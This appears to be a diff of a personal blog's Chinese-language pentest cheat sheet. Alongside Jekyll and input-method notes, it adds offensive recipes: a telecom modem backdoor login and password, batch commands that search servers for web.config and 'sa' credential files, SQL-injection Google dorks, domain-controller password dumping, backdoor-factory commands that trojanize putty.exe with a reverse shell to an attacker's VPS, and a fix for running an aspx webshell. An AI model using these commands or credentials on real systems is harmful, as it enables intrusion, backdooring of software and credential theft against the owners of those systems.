@@ -73,7 +73,7 @@
     <br>
     <br>
     <center>
-        <font color="red" align="center"><i class="fa fa-key" aria-hidden="true"></i><a href="../../../../../book.html"><font color="red"> book</font></a></font>
+        <font color="red" align="center"><i class="fa fa-key" aria-hidden="true"></i><a href="../../../../../book.html/"><font color="red"> book</font></a></font>
     <br>
     <br>
     <font color="red" align="center"><i class="fa fa-music" aria-hidden="true"></i><a href="../../../../../jquery-jplayer/index.html" target="_top"><font color="red"> music</font></a></font>
@@ -118,7 +118,7 @@
 
       <div class="read-time">
         <small>
-          13 minute read
+          15 minute read
         </small>
       </div>
 
@@ -136,6 +136,8 @@
     quote site exec "..."
 <span class="p">4.</span>账号telecomadmin密码nE7jA%5m电信猫后门
 <span class="p">5.</span>linux local_root提权  http: // exploit.linuxnote.org/
+                        https://itunsecurity.wordpress.com/2015/08/16/vulnhub-com-writeup-darknet/(LinEnum.sh,linuxprivchecker.py,unix-privesc-check)
+                        https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect
   windows　https://github.com/GDSSecurity/Windows-Exploit-Suggester
 <span class="p">6.</span>metasploit与postgresql数据库连接：msf &gt; db_connect msf3: AtZDNVQF3NJEyNqU9u1ciHcqTsbcZzKR@127.0.0.1: 5432 / msf3
 <span class="p">7.</span>http: // tool.chacuo.net / mailanonymous   伪造邮件发送，一小时邮箱
@@ -398,10 +400,15 @@
    rar a /v20m /m0 newfilename web.rar
    windows find web.config==&gt;for /r c:<span class="se">\h</span>ttp<span class="se">\ </span>%i in (web.conf?g) do (echo <span class="gs">****</span><span class="ge">*filepath*</span><span class="gs">****</span> &gt;&gt; tmp.txt &amp;&amp; echo %i &gt;&gt; tmp.txt &amp;&amp; type "%i" &gt;&gt; tmp.txt &gt;&gt; tmp.txt &amp;&amp; echo. &gt;&gt; tmp.txt)
    windows bat批处理for用法：http://blog.csdn.net/wh_19910525/article/details/7912440
+
+   findstr /R ".<span class="ge">*sa.*</span>" c:<span class="se">\1\*</span> &gt; tmp.txt
 <span class="p">41.</span>kali linux2.0 import folder path:/usr/share/applications   eg.gnome-control-center network
 <span class="p">42.</span>http://www.orico.com.cn/   driver    
 <span class="p">43.</span>python中单引号，双引号，三引号http://blog.csdn.net/caianye/article/details/6638183       
-<span class="p">44.</span>mygoogle dork：http://waziristanihaxor.blogspot.hk/2015/03/5000-fresh-google-dorks-list-for-sql.html
+<span class="p">44.</span>mygoogle dork：
+    site:ooxx.ooxx.ooxx syntax
+    site:... error
+    http://waziristanihaxor.blogspot.hk/2015/03/5000-fresh-google-dorks-list-for-sql.html
    inurl:"php"|"php page="|"php id="|"php tid="|"php pid="|"php cid="|"php path="|"php cmd="|"php file="|"php cartId="|"php bookid="|"php num="|"php idProduct="|"php ProdId="|"php idCategory="|"php intProdID="|"cfm storeid="|"php catid="|"php cart_id="|"php order_id="|"php catalogid="|"php item="|"php title="|"php CategoryID="|"php action="|"php newsID="|"php newsid="|"php product_id="|"php cat="|"php parent_id="|"php view="|"php itemid=" site:www.facebook.com
 <span class="p">45.</span>os.system('''python %s &gt;&gt; "out_log.txt"''' % exp_path) "&gt;&gt;" instead of "open(file,"a+") fp.write(str)" in py2 or py3
 <span class="p">46.</span>tips:  
@@ -724,6 +731,7 @@
 <span class="p">87.</span>内网渗透：http://www.pojie567.com/blog/?post=5186
              http://www.1990day.com/regeorg-proxychains-gold-partner/
              http://www.codersec.net/%E5%AF%B9%E5%9B%BD%E5%A4%96%E6%9F%90%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E5%B0%8F%E7%BB%93/
+             http://netsecurity.51cto.com/art/201602/506072.htm 使用Quarks PwDump获取域控密码
 <span class="p">88.</span>ipc$:http://www.cnblogs.com/lhws/p/4024208.htm
 <span class="p">89.</span>github pages+jekyll搭建个人博客：
         https://www.zhihu.com/question/20223939
@@ -742,9 +750,59 @@
         http://xinghuacai.github.io
         http://reyhan.org/2013/03/jekyll-archive-without-plugins.html   jekyll archive by year
         myblog/posts-by-categories.html                                 jekyll archive by categories
+        http://www.ithome.com/html/it/195970.htm                        add music to my pages
+<span class="p">90.</span>kali2.0使用pptp vpn时，需要在高级选项里勾选使用点到点加密,如果还不行则选择最安全的加密(128位)，否则不能成功连接，另外，用不了l2tp vpn,不知系统哪里的问题
+<span class="p">91.</span>https://ghostbin.com/  :-&gt; paste? a site has article like:https://ghostbin.com/paste/6kho7?luicode=10000359
+                                                             from:
+                                                             http://drops.wooyun.org/pentesting/15117
+<span class="p">92.</span>kali2安装rime输入法:https://www.goenitz.xyz/post/ubuntu-install-fcitx-rime-and-wubi
+                       https://wu.nerd.moe/?p=1752
+                       /usr/bin/rime_dict_manager自带词库管理工具
+                       http://www.jianshu.com/p/cffc0ea094a7
+                       https://github.com/rime/home/wiki/CustomizationGuide
+                       重新部署使配置生效:---&gt;    rm ~/.config/ibus/rime/default.yaml; ibus-daemon -drx
+                       emoji对应表:https://rimeime.googlecode.com/svn/trunk/artworks/schema/emoji-chart.png
+                       新建default.custom.yaml,内容为patch:...,意思是要覆盖default.yaml中配置,其它如wubi_pinyin.yaml等对应wubi_pinyin.custom.yaml
+                       eg.my default.custom.yaml file:
+                       ---------------------start------------------------
+                            patch:
+                                menu/page_size: 9
+                                schema_list:
+<span class="p">                                  -</span> schema: luna_pinyin
+<span class="p">                                  -</span> schema: luna_pinyin_fluency
+<span class="p">                                  -</span> schema: luna_pinyin_simp
+<span class="p">                                  -</span> schema: wubi_pinyin
+<span class="p">                                  -</span> schema: wubi86
+<span class="p">                                  -</span> schema: emoji
+                                ascii_composer:
+                                  good_old_caps_lock: true
+                                  switch_key:
+                                    Caps_Lock: clear
+                                    Control_L: noop
+                                    Control_R: commit_text
+                                    Eisu_toggle: clear
+                                    Shift_L: commit_code
+                                    Shift_R: inline_ascii
+                      --------------------end----------------------------
+<span class="p">93.</span>windows download:https://www.microsoft.com/en-us/search/result.aspx?q=windows+xp+professional+x64+edition&amp;form=MSHOME
+<span class="p">94.</span>backdoor-factory用法:
+<span class="p">    1.</span>单独的backdoor-factory:backdoor-factory -f /root/Desktop/putty.exe -S (check if the putty.exe is support for backdoor-factory)
+                             backdoor-factory -f /root/Desktop/putty.exe -s show (show usable kinds of reverse shell supported)
+                             backdoor-factory -f /root/Desktop/putty.exe -s ...(... is a kind of shell from former 'show' command) -H vps's ip -P 200
+<span class="p">    2.</span>backdoor-factory in veil:--&gt;veil--&gt;list--&gt;number of native/backdoor-factory--&gt;options--&gt;set the options
+<span class="p">95.</span>aspx大马连接报错"/"解决方法:http://www.asp-muma.com/?post=97
+   my way defferent from uppon one:
+   create a new folder,create a web.config file with below content:
+   --------------------------content------------------------
+    <span class="nt">&lt;configuration&gt;</span>
+        <span class="nt">&lt;system</span><span class="err">.</span><span class="na">web</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;customErrors</span> <span class="na">mode=</span><span class="s">"Off"</span><span class="nt">/&gt;</span>
+        <span class="err">&lt;</span>/system.web&gt;
+    <span class="nt">&lt;/configuration&gt;</span>
+   --------------------------end of content----------------
+   then upon a strong webshell to my new created folder,found no more error.
 </code></pre>
 </div>
-
 </span>
 
         
